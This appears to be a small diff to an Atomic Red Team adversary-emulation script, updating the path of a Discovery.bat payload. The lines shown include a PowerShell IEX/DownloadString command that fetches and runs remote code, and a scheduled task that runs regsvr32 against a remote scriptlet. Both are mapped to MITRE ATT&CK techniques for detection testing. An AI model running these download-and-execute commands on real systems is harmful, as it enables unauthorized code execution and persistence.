@@ -16,7 +16,7 @@ SCHTASKS /Create /SC MINUTE /TN "Atomic Testing" /TR "regsvr32.exe /s /u /i:http
 :: Execution: https://attack.mitre.org/wiki/Technique/T1086
 :: Have PowerShell download the Discovery.bat, output to a local file (for review later)
 
-powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat')" > output.txt
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')" > output.txt
 
 :: Tactic: Credential Access
 :: Technique: Create Account https://attack.mitre.org/wiki/Technique/T1136
